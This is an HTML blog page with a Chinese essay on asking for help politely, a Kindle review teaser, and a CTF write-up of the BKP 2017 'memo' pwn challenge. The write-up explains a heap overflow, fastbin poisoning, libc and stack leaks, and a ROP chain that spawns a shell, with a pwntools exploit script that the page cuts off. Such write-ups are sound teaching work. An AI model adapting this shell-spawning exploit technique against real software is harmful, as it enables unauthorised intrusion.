<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="en">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Liunx Python Rust Goalng DevOPS" />










<meta name="description" content="个人随想，瞎子的世界">
<meta property="og:type" content="website">
<meta property="og:title" content="逐流小站">
<meta property="og:url" content="https://blog.feedscoin.com/page/41/index.html">
<meta property="og:site_name" content="逐流小站">
<meta property="og:description" content="个人随想，瞎子的世界">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Laird Lau">
<meta property="article:tag" content="Liunx Python Rust Goalng DevOPS">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://blog.feedscoin.com/page/41/"/>





  <title>逐流小站</title>
  




<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
  ga('create', 'G-MW47YH6RH0', 'auto');
  ga('send', 'pageview');
</script>





<meta name="generator" content="Hexo 7.0.0"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">逐流小站</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">想回到那个能随便跳槽的年代</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            Categories
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
            
            Sitemap
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/03/05/2017-03-05-how-to-get-help/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/03/05/2017-03-05-how-to-get-help/" itemprop="url">如何请教别人</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-03-05T00:54:28+08:00">
                2017-03-05
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>我多多少少在 iOS 圈子里面有一点点知名度，所以在微博、微信、公众号上找我问问题的人不少。但是，大部分的程序员都不懂得如何请教别人，其实这件事情只需要学会「换位思考」就会好很多，但是还是有人做不好。</p>
<p>这篇文章主要是写给我自己用的，以后再遇到不会提问题的人，我就贴给他这篇文章就可以了。</p>
<p>如何请教别人呢，要做到以下几点。</p>
<h2 id="合适的自我介绍"><a href="#合适的自我介绍" class="headerlink" title="合适的自我介绍"></a>合适的自我介绍</h2><p>上次有一个人在一个线下分享会后一直拉着我问问题，我一直忍着没有问他是谁，后来问了太多，我实在受不了了，我问他：你是谁呀，为什么好像和我很熟的样子？他说：哦，我是一个 iOS 开发，你没必要记住我的名字。</p>
<p>类似的情形出现过多次，还有一些人把名字故意取成很个性的，完全无法记住的 emoji 表情或者符号，也不做自我介绍，我完全无法记住这些人。</p>
<p>合适的自我介绍为什么重要呢？因为它代表着一种尊重和平等。我义务解答问题没有关系，但是我即使完全不求回报，也希望我到底帮助的是谁。这个提问者的名字，毕业学校，工作单位，以及他的问题，都会给我带来记忆。</p>
<p>这其实是基本的礼仪，看看那些著名演讲或者发布会的提问环节吧，提问者都会先自我介绍一番。</p>
<h2 id="在吗？"><a href="#在吗？" class="headerlink" title="在吗？"></a>在吗？</h2><p>「在吗」，基本上以这种方式和我打招呼的提问者，通常都是令我感受非常差的。因为这意味着：我看到了必须回答在，我回答在了之后，还必须立即响应他后续的问题。</p>
<p>同学们，现在连 QQ 都取消在线状态了，有什么事情不能用留言的方式解决呢？说白了，还不是提问者自我为中心，他们希望偷懒，连在请教别人这件事情上，他们都希望不要浪费自己的打字 —- 如果对方不在，我就可以不用打字提问题了，免得提了别人不答。</p>
<p>但是，如果你这么不尊重对方的时间，又何来让对方免费的、在线互动地和你一问一答帮助你解决你的问题？</p>
<p>凭什么？</p>
<h2 id="不会提问"><a href="#不会提问" class="headerlink" title="不会提问"></a>不会提问</h2><p>很多人都描述不清楚自己的问题，需要我来帮助他们一点点来弄清楚他到底想问什么。我举一个例子：</p>
<p>上次一个人在群里面问：有谁知道怎么更新 Mac 的 Numbers 吗？我以为他是一个 Mac 新手，于是我说：打开 Mac 的 App Store 应用，在 Updates 里面找到 Numbers，然后点 “update” 按钮。</p>
<p>结果他说：我知道，但是我为什么点了没有反应呢？我这个时候才发现，他其实是想问为什么 App Store 响应慢。于是我推荐他设置了一些加速下载的 DNS。</p>
<p>因为这个人我认识，所以我继续在帮助他。但是其实他给了我相当糟糕的体验。因为我在帮助他的时候，我在努力把解决方案说清楚，但是他懒得连问题都不想说清楚。或者，他认为只要他说「不会更新某个应用」，就表示的是 AppStore 卡顿，而不是别的意思。</p>
<h2 id="提傻问题"><a href="#提傻问题" class="headerlink" title="提傻问题"></a>提傻问题</h2><p>对于 iOS 开发者来说，向我提的最傻的两类问题是：审核问题和具体的 API 问题。</p>
<p>例如：</p>
<blockquote>
<p>唐老师，麻烦看看：<br>Your app uses public APIs in an unapproved manner, which does not comply with section 3.3.1 of the Apple Developer Program License Agreement.</p>
<p>Specifically, your app was found to use “canOpenURL:” to scan for an arbitrarily large list of apps. Use of this method for generalized app detection is not appropriate.</p>
<p>Since there is no accurate way of predicting how an API may be modified and what effects those modifications may have, Apple does not permit unapproved uses of public APIs in App Store apps.</p>
</blockquote>
<p>审核的问题大部分情况下英文的审核意见已经说得非常清楚了，我实在没有什么动力做翻译。</p>
<p>另外如果是问 iOS 开发某个特定细节 API 的使用问题，其实是没有哪个人能够对苹果的所有 API 都了解得那么清楚的，与其问我，还不如用 Google 搜索或者查文档更好。</p>
<h2 id="扔代码"><a href="#扔代码" class="headerlink" title="扔代码"></a>扔代码</h2><p>上来就扔一段代码，然后说：照着你的博客写的，为什么出问题了呢？好象我写了免费的博客，就有义务帮他找 Bug 一样。</p>
<p>当然，扔代码的还算好的，还有扔过来一个 GitHub 工程的，说：「麻烦帮忙看看」，这真的是要让我吐血。。。</p>
<h2 id="情绪方面的问题"><a href="#情绪方面的问题" class="headerlink" title="情绪方面的问题"></a>情绪方面的问题</h2><p>巧哥，我 iOS 找不到工作怎么办？</p>
<p>巧哥，我希望从 xx 方向换到 iOS 方向，你怎么看？</p>
<p>巧哥，我的老大对我很差，你说我应不应该换一份工作？</p>
<p>大部分这些问题，我其实也只能说：努力努力再努力，或者选择沉默。因为我确实也帮不上什么忙。如果需要找人安抚心情的话，找好朋友可能更适合。</p>
<h2 id="不会感谢"><a href="#不会感谢" class="headerlink" title="不会感谢"></a>不会感谢</h2><p>说句谢谢是最最基本的。</p>
<p>如果你的问题花费了别人大量的时间，例如几个小时或者一天，那么请别人吃个饭也是正常的。大家都是成年人，倒不是说要多功利，这仅是相互的尊重。</p>
<p>我现在如果有很困扰的问题要请教别人，简单几句能说清楚的，我会给别人微信留言说清楚，然后附一个 66 元的红包。简单几句说不清楚的，我会和别人约个时间当面请教，然后顺便请别人吃顿饭。外地的朋友，实在不知道如何感谢，我会说：希望以后如果需要我的时候，能够找我提供帮助。</p>
<h2 id="我的困境"><a href="#我的困境" class="headerlink" title="我的困境"></a>我的困境</h2><p>最后分享一下我的困境。</p>
<p>我每天收到几十个求助的问题，但是我精力非常有限，对于我来说时间优先级肯定是：首先完成工作上的事情、然后完成家里的事情、然后是娱乐和学习、然后是和朋友聊天交流、然后是休息，如果上面这些做完了，偶尔有精力，正好遇上了会提问，提的问题又是经过深入思考，而恰好我又知道答案，答案又恰好不会花费特别多的时间，那么我才有可能回答。</p>
<p>当然，如果是朋友的问题，我会把这个看作我处理社交关系的一件事情，那我可能就会放弃一些休息或学习时间来帮助朋友，因为或许有一天我也会需要朋友的帮助，同时朋友的成功也会给我带来开心。</p>
<p>希望这篇文章能够教会大家这个简单的「换位思考」法则。</p>
<p>谢谢。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/03/05/2017/kindle-pw3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/03/05/2017/kindle-pw3/" itemprop="url">至臻完美，只为阅读 —— Kindle Paperwhite 简评</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-03-05T00:08:48+08:00">
                2017-03-05
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%9A%8F%E7%AC%94/" itemprop="url" rel="index">
                    <span itemprop="name">随笔</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p><img src="https://ooo.0o0.ooo/2017/03/04/58bab82fcd86e.jpg" alt="Kindle Paperwhite 3"></p>
<p>最近入手了 Kindle Paperwhite 电子书阅读器，用了一段时间后给大家简单地评价一下。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2017/03/05/2017/kindle-pw3/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2017/03/01/BOSTONKEYPARTY-CTF-2017-memo-300/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/03/01/BOSTONKEYPARTY-CTF-2017-memo-300/" itemprop="url">[BOSTONKEYPARTY CTF 2017] memo 300</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-03-01T16:38:40+08:00">
                2017-03-01
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><blockquote>
<p>Category: pwn<br>Point: 300<br>Solver: Naetw @ BambooFox</p>
</blockquote>
<h2 id="Analyzing"><a href="#Analyzing" class="headerlink" title="Analyzing"></a>Analyzing</h2><p>64 bits ELF, Full RELRO, 有 NX, 沒有 canary &amp; PIE</p>
<ul>
<li>一些在這支程式會用到的 global variable：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------+</span><br><span class="line">| idx       |           |  # 之後 leave or edit or delete 會透過這個 global buffer 來存取 index</span><br><span class="line">|           |           |</span><br><span class="line">+-----------------------+</span><br><span class="line">| name      |           |  # Store user name(32 bytes)</span><br><span class="line">|           |           |</span><br><span class="line">+-----------------------+</span><br><span class="line">| password  |           |  # Store user&#x27;s password</span><br><span class="line">|           |           |</span><br><span class="line">+-----------------------+</span><br><span class="line">| idx0 idx1 | idx2 idx3 |  # Store size of messages( 4 bytes per size of msg )</span><br><span class="line">+-----------------------+</span><br><span class="line">| msg0 adr  | msg1 adr  |  # Store address of messages</span><br><span class="line">| msg2 adr  | msg3 adr  |</span><br><span class="line">+-----------------------+</span><br></pre></td></tr></table></figure>

<p>這題一開始會問 user name，並存在 global buffer，接著會問要不要設定密碼，密碼長度最大 32 bytes</p>
<p>User name &amp; password 設定好之後有五個選項：</p>
<p>Leave message:</p>
<ul>
<li>首先會問 index，之後如果 size 正確會存入上面提到的 global buffer</li>
<li>接著會問 msg size，如果大於 32 bytes，他只會呼叫 <code>malloc(32)</code> 給你，但是 read 完之後不會存入 global buffer 的 list 之中。這裡有一個 <strong>overflow</strong> 的漏洞，如果我 size 輸入 100，他雖然只有 <code>malloc(32)</code> 但是他會 read(0, buf, size)，因此後面可以利用這個洞改到其他 chunk struct</li>
<li>如果 size 小於 32 bytes，在讀完 message 之後會存到上面提到的 list</li>
</ul>
<p>Edit message:</p>
<ul>
<li>這邊會直接用 global buffer 上的 idx 所表示的值來決定要修改哪個 message，因此這邊只能修改最後一次留下的 message</li>
<li>read size 是利用 global buffer 上的 size list</li>
</ul>
<p>View message:</p>
<ul>
<li>印出 message 內容</li>
<li>之後會拿來 leak libc address</li>
</ul>
<p>Delete message:</p>
<ul>
<li>一開始會問 index，但是並沒有做 0~4 的檢查，所以前面的 name or password 可以任意構造 address 來達到任意 <code>free</code>，不過這裡我不是利用這個方法。利用這個方法可參考 <a target="_blank" rel="noopener" href="https://github.com/scwuaptx/CTF/blob/master/2017-writeup/bkp/memo.py">Angelboy 學長</a></li>
<li><code>free</code> 完之後，global list 會清成 0，因此沒有 <strong>UAF</strong></li>
</ul>
<p>Change password:</p>
<ul>
<li>可以修改密碼，但是這邊我沒有用到，便不細說</li>
</ul>
<p>Quit:</p>
<ul>
<li><code>puts</code> 後 return，後面會利用這邊的 return 跳到 ROP</li>
</ul>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>前面名字隨便亂取，但是密碼稍微構造一下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x602a40:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602a50:       0x4141414141414141      0x0000000000000030</span><br></pre></td></tr></table></figure>

<ul>
<li><code>0x602a58</code> 的 <code>0x30</code> 是為了後面 overwrite fastbin 的時候，讓 <code>malloc(32)</code> return <code>0x602a60</code> 之後就可以做任意 leak 跟 任意 overwrite</li>
</ul>
<p>接著 leave two messages，index 分別 0 and 1，size 都給 32，之後 global buffer 長這樣：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602a40:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602a50:       0x4141414141414141      0x0000000000000030</span><br><span class="line">0x602a60:       0x0000002000000020      0x0000000000000000</span><br><span class="line">0x602a70:       0x0000000000d41010      0x0000000000d41040</span><br></pre></td></tr></table></figure>

<ul>
<li><code>0x602a60</code> 的前 4 bytes 是 index0 msg size，後 4 bytes 就是 index1 msg size</li>
<li><code>0x602a70</code> 存的就是 index0 msg address，<code>0x602a78</code> 存的則是 index1 msg address</li>
</ul>
<p>之後就要來 overflow，要達到任意 <code>malloc</code> 一塊空間，需要 overflow 一個已經 <code>free</code> 過的 fastbin chunk，由於 fastbin list 是 LIFO，因此先將 index1 msg <code>free</code> 掉，接著 <code>free</code> index0 msg，之後再來利用前面提到 size 超過 32 的 overflow，size 給他個 400，這樣他還是會 call <code>malloc(32)</code>，因此我們依舊能拿到跟先前 index0 msg 同一塊 chunk</p>
<p>這時候我們有 overflow 可以把 index1 msg struct 改寫掉，這邊我們是改寫他的 <code>fd</code> 這樣之後先 <code>malloc</code> 一次把正常的 chunk 拿走，第二次就會拿到我們填的 <code>fd</code> 的位置</p>
<p>overflow 過的 layout：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0xd41000:       0x0000000000000000      0x0000000000000031  # Original index0 msg chunk</span><br><span class="line">0xd41010:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0xd41020:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0xd41030:       0x0000000000000000      0x0000000000000031  # Original index1 msg chunk</span><br><span class="line">0xd41040:       0x0000000000602a50      0x000000000000000a  # 0x602a50 - fake chunk by password</span><br><span class="line">0xd41050:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0xd41060:       0x0000000000000000      0x0000000000020fa1</span><br></pre></td></tr></table></figure>

<p>因為 <code>malloc</code> 會檢查 chunk size 是不是符合同一個 fastbin 的 size，所以前面 password 裡面的 <code>0x30</code> 就派上用場了，如此一來第二次的 <code>malloc</code> 可以通過檢查讓我們可以拿到 <code>0x602a60</code>，接著因為這個 chunk data 的開頭是 <code>size_list</code> 所以稍微構造一下 input，把 size 從 32 調大，順便擺上某個 function 的 <code>got.plt</code>，size 是為了後面疊 ROP 的時候比較方便，<code>got.plt</code> 則是拿來 leak libc function，底下是 layout：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x602a40:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602a50:       0x4141414141414141      0x0000000000000030</span><br><span class="line">0x602a60:       0x000000f0000000f0      0x00000020000000f0</span><br><span class="line">0x602a70:       0x0000000000601fb0      0x000000000000000a</span><br><span class="line">0x602a80:       0x0000000000000000      0x0000000000602a60</span><br></pre></td></tr></table></figure>

<ul>
<li>這邊把假 chunk 放在 index3 這樣可以一次利用到 0~2</li>
<li>index3 size 因為 leave 最後面的行為會把 <code>0xf0</code> 蓋掉改回 <code>0x20</code> 不過沒關係後面會進行一次 <code>edit</code> 會把他改寫回來</li>
</ul>
<p>接著就可以利用 <code>view(0)</code>，來 leak <code>0x601fb0</code> 也就是 <code>__libc_start_main</code> 的 libc address，拿到之後，利用一次 <code>edit</code> 把 size 改回 <code>0xf0</code> 順便把 <code>0x601fb0</code> 換成 <code>environ</code> 的位置，來 leak stack address(environ 是一個在 libc 裡面的一個 symbol，他裡面存著 stack address 指到 <code>char** envp</code>)：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x602a40:       0x4141414141414141      0x4141414141414141</span><br><span class="line">0x602a50:       0x4141414141414141      0x0000000000000030</span><br><span class="line">0x602a60:       0x000000f0000000f0      0x000000f0000000f0</span><br><span class="line">0x602a70:       0x00007fb71186af98      0x000000000000000a</span><br><span class="line">0x602a80:       0x0000000000000000      0x0000000000602a60</span><br></pre></td></tr></table></figure>

<p>一樣利用 <code>view(0)</code> 來 leak stack address，算一下跟 <code>main</code> 的 return address 位置的 offset，之後，再次利用 <code>edit</code> 不過這次是要 overwrite <code>0x602a88</code> 位置，也就是 index3 message 的位置，把它改成 <code>main return address</code> 的位置，這樣再次 <code>edit</code> 就可以疊 ROP，疊完就選擇 <code>Quit</code> 便會跳到剛剛疊的 ROP 上，這次 ROP 很簡單，從 libc 裡面找一個 gadget <code>pop_rdi_ret</code> 然後 sh 字串也是從 libc 裡面找，接著直接跳到 <code>system</code>，成功開 shell ！</p>
<p>改成 stack address 的 layout + ROP：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x602a40</span>:       <span class="number">0x4141414141414141</span>      <span class="number">0x4141414141414141</span></span><br><span class="line"><span class="number">0x602a50</span>:       <span class="number">0x4141414141414141</span>      <span class="number">0x0000000000000030</span></span><br><span class="line"><span class="number">0x602a60</span>:       <span class="number">0x000000f0000000f0</span>      <span class="number">0x000000f0000000f0</span></span><br><span class="line"><span class="number">0x602a70</span>:       <span class="number">0x4141414141414141</span>      <span class="number">0x4141414141414141</span></span><br><span class="line"><span class="number">0x602a80</span>:       <span class="number">0x4141414141414141</span>      <span class="number">0x00007ffda8984928</span>  <span class="comment"># stack address</span></span><br><span class="line"></span><br><span class="line">ROP:</span><br><span class="line">sh = base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">system = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi =  base + <span class="number">0x0000000000021102</span></span><br><span class="line">payload = p64(pop_rdi) + p64(sh) + p64(system)</span><br><span class="line">edit(payload)</span><br></pre></td></tr></table></figure>

<p>Final Exploit:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * <span class="comment"># pip install pwntools</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">reip = <span class="string">&#x27;54.202.7.144&#x27;</span></span><br><span class="line">report = <span class="number">8888</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./memo-patch&#x27;</span>)</span><br><span class="line"><span class="comment">#r = remote(reip, report)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Setup name &amp; pw</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;What&#x27;s user name:&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;nae&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Do you wanna set password? (y/n)&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;Password:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;A&#x27;</span>*<span class="number">24</span> + p64(<span class="number">0x30</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span 